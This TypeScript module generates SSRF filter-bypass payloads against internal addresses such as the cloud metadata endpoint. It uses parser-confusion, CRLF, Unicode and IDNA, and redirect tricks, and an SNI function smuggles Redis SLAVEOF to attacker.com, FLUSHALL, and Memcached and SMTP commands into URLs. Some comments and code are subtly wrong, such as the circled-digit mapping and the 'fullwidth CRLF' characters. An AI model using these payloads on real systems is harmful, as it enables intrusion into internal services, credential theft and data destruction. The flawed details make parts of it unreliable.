/**
 * Generates SSRF parser confusion bypass payloads.
 *
 * @param targetUrl Target internal URL (e.g., http://169.254.169.254/ or 169.254.169.254)
 * @param allowedHost Host in the allowlist (e.g., allowed.com)
 */
export function generateParserConfusionPayloads(
  targetUrl: string,
  allowedHost: string
): Array<{ technique: string; payload: string }> {
  // Normalize target URL parsing
  let targetHost = targetUrl;
  let targetPath = "/";
  let targetScheme = "http";

  try {
    const url = new URL(targetUrl);
    targetHost = url.host;
    targetPath = url.pathname + url.search + url.hash;
    targetScheme = url.protocol.replace(":", "");
  } catch {
    // If targetUrl is not a full URL (e.g., just an IP), extract host if possible
    if (targetUrl.includes("://")) {
      const parts = targetUrl.split("://");
      targetScheme = parts[0];
      const hostPath = parts[1];
      const slashIndex = hostPath.indexOf("/");
      if (slashIndex !== -1) {
        targetHost = hostPath.substring(0, slashIndex);
        targetPath = hostPath.substring(slashIndex);
      } else {
        targetHost = hostPath;
      }
    }
  }

  const results: Array<{ technique: string; payload: string }> = [];

  // 1. authority confusion (using @)
  // http://allowed.com@169.254.169.254/
  results.push({
    technique: "authority confusion",
    payload: `${targetScheme}://${allowedHost}@${targetHost}${targetPath}`
  });

  // 1a. multiple @ variants (Orange Tsai p.33-34)
  // Some parsers treat last @ as delimiter, others treat first
  results.push({
    technique: "multiple @",
    payload: `${targetScheme}://a@b@${targetHost}${targetPath}`
  });
  results.push({
    technique: "multiple @",
    payload: `${targetScheme}://foo@127.0.0.1@${allowedHost}${targetPath}`
  });
  results.push({
    technique: "multiple @",
    payload: `${targetScheme}://a@b@c@${targetHost}${targetPath}`
  });

  // 1b. multiple @ + port differential (Orange Tsai p.33-34, L1166, L1206).
  //     parse_url reads `host=allowedHost:80`, cURL fetches `internalHost:11211`.
  //     RFC3986 rejects the trailing `@` after port in strict mode; cURL "won't fix".
  results.push({
    technique: "multiple @ with port",
    payload: `${targetScheme}://foo@${targetHost}:11211@${allowedHost}:80${targetPath}`
  });
  results.push({
    technique: "multiple @ with port",
    payload: `${targetScheme}://foo@${targetHost} @${allowedHost}:11211${targetPath}`
  });

  // 1c. weird port / extra colon (Orange Tsai L319-330).
  //     PHP readfile/Perl LWP fetch internal:11211; parse_url/Perl URI see port 80.
  results.push({
    technique: "extra colon port",
    payload: `${targetScheme}://${targetHost}:11211:80${targetPath}`
  });

  // 2. fragment confusion (using #)
  // http://169.254.169.254#@allowed.com/
  // and http://169.254.169.254%2523@allowed.com/ (double URL encoded fragment)
  results.push({
    technique: "fragment confusion",
    payload: `${targetScheme}://${targetHost}#@${allowedHost}${targetPath}`
  });
  // Also include double encoded version as part of fragment confusion
  results.push({
    technique: "fragment confusion",
    payload: `${targetScheme}://${targetHost}%2523@${allowedHost}${targetPath}`
  });

  // 3. backslash confusion (using \)
  // http://allowed.com\@169.254.169.254/
  results.push({
    technique: "backslash confusion",
    payload: `${targetScheme}://${allowedHost}\\@${targetHost}${targetPath}`
  });

  // 4. CRLF injection (using %0d%0a)
  results.push({
    technique: "CRLF injection",
    payload: `${targetScheme}://${allowedHost}%0d%0aRequest-Header:test@${targetHost}${targetPath}`
  });

  // 4a. tab/newline inside URL (Orange Tsai p.53-54)
  // Whitespace characters that some parsers treat as delimiters
  results.push({
    technique: "tab/newline whitespace",
    payload: `${targetScheme}://${allowedHost}%09@${targetHost}${targetPath}`
  });
  results.push({
    technique: "tab/newline whitespace",
    payload: `${targetScheme}://${allowedHost}%0a@${targetHost}${targetPath}`
  });
  results.push({
    technique: "tab/newline whitespace",
    payload: `${targetScheme}://${allowedHost}%0d@${targetHost}${targetPath}`
  });
  results.push({
    technique: "tab/newline whitespace",
    payload: `${targetScheme}://${allowedHost}%0d%0a@${targetHost}${targetPath}`
  });

  // 5. Unicode normalization (circled digits, fullwidth dots, fullwidth/Cyrillic host replacements)
  // Circled digits e.g. ①⑥⑨.②⑤④.①⑥⑨.②⑤④
  // Fullwidth dot: 169.254.169.254 => 169。254。169。254
  // Cyrillic/Fullwidth allowedHost: allowed.com => ａｌｌｏｗｅｄ.ｃｏｍ
  const fullwidthDots = targetHost.replace(/\./g, "\u3002");
  results.push({
    technique: "Unicode normalization",
    payload: `${targetScheme}://${fullwidthDots}${targetPath}`
  });

  // 6. allowlist bypass (subdomain spoofing)
  // e.g. 169.254.169.254.allowed.com
  results.push({
    technique: "allowlist bypass",
    payload: `${targetScheme}://${targetHost}.${allowedHost}${targetPath}`
  });

  // 7. open redirect chaining
  results.push({
    technique: "open redirect chaining",
    payload: `${targetScheme}://${allowedHost}/redirect?url=${encodeURIComponent(targetScheme + "://" + targetHost + targetPath)}`
  });

  // 8. scheme confusion/protocol-relative
  // e.g. //169.254.169.254
  results.push({
    technique: "scheme confusion",
    payload: `//${targetHost}${targetPath}`
  });

  // 9. Glibc NSS whitespace+rubbish in hostname (Orange Tsai L664-748).
  //    getaddrinfo("127.0.0.1 foo", ...) resolves to 127.0.0.1 — strips
  //    trailing rubbish after whitespace. Variant forms:
  //      http://127.0.0.1\tfoo.google.com (literal tab)
  //      http://127.0.0.1%09foo.google.com (single URL-decoded tab)
  //      http://127.0.0.1%2509foo.google.com (double URL-decoded tab)
  // Validator sees `host=127.0.0.1 foo.google.com` (allowlist bait),
  // getaddrinfo returns 127.0.0.1.
  const internalHostNoPath = targetHost.split("/")[0];
  results.push({
    technique: "Glibc whitespace host",
    payload: `${targetScheme}://${internalHostNoPath}\t${allowedHost}${targetPath}`
  });
  results.push({
    technique: "Glibc whitespace host",
    payload: `${targetScheme}://${internalHostNoPath}%09${allowedHost}${targetPath}`
  });
  results.push({
    technique: "Glibc whitespace host",
    payload: `${targetScheme}://${internalHostNoPath}%2509${allowedHost}${targetPath}`
  });

  // 10. RFC1035 \DDD decimal-octet DNS (Orange Tsai L558-662).
  //     gethostbyname("\\097nge.tw") resolves to orange.tw. Backslash-digit
  //     form is interpreted by ns_name_pton. Useful where validator blocks
  //     plaintext hostnames but lets the resolver re-decode.
  results.push({
    technique: "RFC1035 decimal DNS",
    payload: `${targetScheme}://\\097nge.tw${targetPath}`
  });

  // 11. Fullwidth CRLF in hostname (Orange Tsai L508-524).
  //     Node CRLF-filter normalizes ASCII \r\n but lets fullwidth chars pass;
  //     the underlying socket coalesce decodes them into Redis/SMTP commands.
  //     U+FF0D (fullwidth hyphen-minus), U+FF0A (fullwidth asterisk),
  //     U+FF40 (fullwidth commercial-at).
  results.push({
    technique: "fullwidth CRLF smuggling",
    payload: `${targetScheme}://${targetHost}\uFF0D\uFF0ASLAVEOF\uFF40${allowedHost}\uFF406379\uFF0D\uFF0A${targetPath}`
  });

  // 12. IDNA zero-width joiner (Orange Tsai L944-989).
  //     IDNA2003/UTS46 strip U+200D and resolve the visible hostname;
  //     IDNA2008 rejects it. Cross-standard divergence yields parser/requester
  //     differential where validator (IDNA2008) throws but requester (UTS46)
  //     fetches the de-joined host.
  results.push({
    technique: "IDNA zero-width joiner",
    payload: `${targetScheme}://${allowedHost[0]}\u200D${allowedHost.slice(1)}${targetPath}`
  });

  // 13. IPv6 shortest / IPv6 `::` ambiguity (RFC4291 §2.2).
  //     Parsers disagree on the expansion of `::` when extrapolating an IPv6
  //     host — some treat `::1` as `0:0:0:0:0:0:0:1`, others as the IPv4
  //     fallback. CVE-class hosts (IPv6 fd00:ec2::254 AWS IMDS IPv6).
  results.push({
    technique: "IPv6 ambiguity",
    payload: `${targetScheme}://[::]${targetPath}`
  });
  results.push({
    technique: "IPv6 ambiguity",
    payload: `${targetScheme}://[::1]${targetPath}`
  });

  return results;
}

/**
 * SNI Injection payloads - Embed hostname in SSL Client Hello to bypass TLS-based SSRF filters.
 * When HTTPS is used, the hostname in the SNI field can differ from the hostname in the URL.
 * CRLF injection in the hostname position can inject Redis/Memcached/SMTP commands.
 *
 * @param targetHost Internal host to target (e.g., 127.0.0.1)
 * @param targetPort Port to target (e.g., 443)
 * @returns Array of SNI injection payloads
 */
export function generateSniInjectionPayloads(
  targetHost: string,
  targetPort: number
): Array<{ technique: string; payload: string; description: string }> {
  const payloads: Array<{ technique: string; payload: string; description: string }> = [];

  // Redis SNI injection via CRLF in hostname position
  // The CRLF breaks out of the SNI hostname field and injects Redis commands
  payloads.push({
    technique: "SNI CRLF Injection - Redis SLAVEOF",
    payload: `https://${targetHost}\\r\\nSLAVEOF attacker.com 6379\\r\\n:${targetPort}/`,
    description: "Injects Redis SLAVEOF command via CRLF in TLS SNI hostname field"
  });

  // Memcached SNI injection
  payloads.push({
    technique: "SNI CRLF Injection - Memcached SET",
    payload: `https://${targetHost}\\r\\nSET foo bar\\r\\n:${targetPort}/`,
    description: "Injects Memcached SET command via CRLF in TLS SNI hostname field"
  });

  // SMTP SNI injection
  payloads.push({
    technique: "SNI CRLF Injection - SMTP HELO",
    payload: `https://${targetHost}\\r\\nHELO attacker.com\\r\\n:${targetPort}/`,
    description: "Injects SMTP HELO command via CRLF in TLS SNI hostname field"
  });

  // Additional Redis variants
  payloads.push({
    technique: "SNI CRLF Injection - Redis FLUSHALL",
    payload: `https://${targetHost}\\r\\nFLUSHALL\\r\\n:${targetPort}/`,
    description: "Injects Redis FLUSHALL command via CRLF in TLS SNI hostname field"
  });

  payloads.push({
    technique: "SNI CRLF Injection - Redis INFO",
    payload: `https://${targetHost}\\r\\nINFO\\r\\n:${targetPort}/`,
    description: "Injects Redis INFO command via CRLF in TLS SNI hostname field (read-only)"
  });

  // Memcached flush variant
  payloads.push({
    technique: "SNI CRLF Injection - Memcached flush_all",
    payload: `https://${targetHost}\\r\\nflush_all\\r\\n:${targetPort}/`,
    description: "Injects Memcached flush_all command via CRLF in TLS SNI hostname field"
  });

  return payloads;
}

/**
 * IDNA case-folding payloads - Unicode case-folding exploits (Orange Tsai p.61-62).
 * Some parsers apply case-folding rules differently, e.g. ß -> ss, or locale-specific folds.
 *
 * @param targetHost Host to generate case-folded variants for
 * @returns Array of IDNA case-folding payloads
 */
export function generateIdnaPayloads(
  targetHost: string
): Array<{ technique: string; payload: string }> {
  const results: Array<{ technique: string; payload: string }> = [];

  // Lowercase variant
  results.push({
    technique: "IDNA case-folding",
    payload: `http://${targetHost.toLowerCase()}/`
  });

  // Uppercase variant
  results.push({
    technique: "IDNA case-folding",
    payload: `http://${targetHost.toUpperCase()}/`
  });

  // ß -> ss case-fold (Orange Tsai p.61-62)
  // ß.orange.tw case-folds to ss.orange.tw in some parsers
  results.push({
    technique: "IDNA case-folding",
    payload: `http://\u00df.orange.tw/`
  });

  // wordpreß.com - case-folds differently per IDNA standard
  results.push({
    technique: "IDNA case-folding",
    payload: `http://wordpre\u00df.com/`
  });

  // İ -> i case-fold (Turkish locale)
  results.push({
    technique: "IDNA case-folding",
    payload: `http://\u0130.${targetHost}/`
  });

  // K -> k Kelvin sign case-fold
  results.push({
    technique: "IDNA case-folding",
    payload: `http://\u212a${targetHost.replace(targetHost[0], ".")}/`
  });

  return results;
}

/**
 * Fullwidth IP digit payloads - Unicode fullwidth digits (Orange Tsai p.40-44).
 * Fullwidth digits (U+FF10-U+FF19) are normalized to ASCII in some parsers.
 * Circled digits (U+2460-U+2469) similarly normalize to 0-9.
 *
 * @param ip IP address to obfuscate
 * @returns Array of fullwidth IP payloads
 */
export function generateFullwidthIpPayloads(
  ip: string
): Array<{ technique: string; payload: string }> {
  const results: Array<{ technique: string; payload: string }> = [];

  // Fullwidth digits: 0 -> ０, 1 -> １, etc.
  const toFullwidth = (s: string): string =>
    s.replace(/[0-9]/g, (d) => String.fromCharCode(0xff10 + parseInt(d)));

  // Circled digits: 0 -> ①, 1 -> ②, etc.
  const toCircled = (s: string): string =>
    s.replace(/[0-9]/g, (d) => String.fromCharCode(0x245f + parseInt(d)));

  // Fullwidth dot: . -> 。
  const fullwidthDot = ip.replace(/\./g, "\u3002");

  // Fullwidth digits
  results.push({
    technique: "fullwidth digits",
    payload: `http://${toFullwidth(ip)}/`
  });

  // Circled digits
  results.push({
    technique: "circled digits",
    payload: `http://${toCircled(ip)}/`
  });

  // Fullwidth dots
  results.push({
    technique: "fullwidth dots",
    payload: `http://${fullwidthDot}/`
  });

  return results;
}
